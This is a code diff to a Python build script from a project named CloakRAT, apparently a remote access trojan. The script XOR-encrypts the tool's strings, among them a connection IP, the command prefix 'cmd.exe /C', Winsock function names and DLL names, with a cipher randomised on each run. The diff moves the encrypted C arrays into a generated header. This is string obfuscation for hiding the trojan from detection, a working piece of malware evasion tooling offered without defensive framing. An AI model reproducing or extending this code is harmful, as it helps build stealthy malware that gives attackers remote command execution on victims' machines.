@@ -14,7 +14,7 @@ strings_to_encrypt = {
     # CloakRAT general strings
     'str_ip': '127.0.0.1',
     'str_cmd': 'cmd.exe /C',
-    'str_dllPath': 'C:\\Users\\tal78\\Desktop\\Workspace\\CloakRAT\\x64\\Debug\\CloakRAT.dll',
+    'str_dllPath': 'C:\\Users\\tal78\\Desktop\\Workspace\\CloakRAT\\x64\\Release\\CloakRAT.dll',
     'str_socket': 'socket',
     
     # function names
@@ -65,11 +65,6 @@ strings_to_encrypt = {
     'str_ntohl': 'ntohl',
     'str_closesocket': 'closesocket',
     'str_WSACleanup': 'WSACleanup',
-    'str_': '',
-    'str_': '',
-    'str_': '',
-    'str_': '',
-    
     
     # DLLs
     'str_kernel32': 'kernel32.dll',
@@ -102,13 +97,12 @@ def xor_encrypt(string_plaintext: str, key: list[int], cipher: str) -> list[int]
     return encrypted_bytes
     
 def to_c_struct(variable_name: str):
-    #typedef struct EncryptedString {{\n    unsigned char* data;\n    size_t length;\n}} EncryptedString;\n
-    return f'EncryptedString {variable_name} = {{\n    {variable_name}_data,\n    sizeof({variable_name}_data)\n}};'
+    return f'static EncryptedString {variable_name} = {{\n    {variable_name}_data,\n    sizeof({variable_name}_data)\n}};'
 
 def to_c_array(variable_name: str, buffer: list[int]) -> str:
     # return in the format: "unsigned char variable_name[] = { ...buffer };"
     elems = ', '.join(str(b) for b in buffer)
-    return f"unsigned char {variable_name}[] = {{ {elems} }};"
+    return f"static unsigned char {variable_name}[] = {{ {elems} }};"
 
 def to_extern_decl(variable_name: str) -> str:
     # return in the format: "extern EncryptedString variable_name;"
@@ -127,16 +121,17 @@ def main():
     byte_chiper = f"((i % 4 | ((i {rand_op1} 9) {rand_op2} 2 + key[i % len(key)] & ((i//2)>>3) * i {rand_op3} key[i % len(key)]) << (i % 5)) & 0x7F ^ {rand_xor_value})" # randomize the cipher each run
     
     # Generate the Source file 
-    with open(f'{DIR}/{SOURCE_NAME}', 'w') as source_file:
-        source_file.write(f'#include \"{HEADER_NAME}\"\n\n')
+    
+    
+    # with open(f'{DIR}/{SOURCE_NAME}', 'w') as source_file:
+    #     source_file.write(f'#include \"{HEADER_NAME}\"\n\n')
         
-        for var_name, string in strings_to_encrypt.items():
-            var_name = f'{var_name}'
-            encrypted_string_lst = xor_encrypt(string, key, byte_chiper)
-            encrypted_c_arr = to_c_array(f'{var_name}_data', encrypted_string_lst)
-            c_struct = to_c_struct(var_name)
-            source_file.write(encrypted_c_arr + '\n')  # Write the encrypted string array
-            source_file.write(c_struct + '\n\n')  # Write the encrypted string struct
+    #     for var_name, string in strings_to_encrypt.items():
+    #         encrypted_string_lst = xor_encrypt(string, key, byte_chiper)
+    #         encrypted_c_arr = to_c_array(f'{var_name}_data', encrypted_string_lst)
+    #         c_struct = to_c_struct(var_name)
+    #         source_file.write(encrypted_c_arr + '\n')  # Write the encrypted string array
+    #         source_file.write(c_struct + '\n\n')  # Write the encrypted string struct
     
     # Generate the Header file
     with open(f'{DIR}/{HEADER_NAME}', 'w') as header_file:
@@ -148,9 +143,14 @@ def main():
         header_file.write(f'static std::array<uint8_t, {KEY_ENTROPY}> {HEADER_XOR_KEY_VARIABLE_NAME} = {{ {', '.join(str(b) for b in key)} }};\n\n')
         header_file.write(f'typedef struct EncryptedString {{\n    unsigned char* data;\n    size_t length;\n}} EncryptedString;\n\n')
         
-        for var_name in strings_to_encrypt.keys():
-            extern_decl = to_extern_decl(var_name)
-            header_file.write(extern_decl + '\n')
+        for var_name, string in strings_to_encrypt.items():
+            #extern_decl = to_extern_decl(var_name)
+            encrypted_string_lst = xor_encrypt(string, key, byte_chiper)
+            encrypted_c_arr = to_c_array(f'{var_name}_data', encrypted_string_lst)
+            c_struct = to_c_struct(var_name)
+            
+            header_file.write(encrypted_c_arr + '\n')
+            header_file.write(c_struct + '\n\n')
 
 if __name__ == '__main__':
         main()
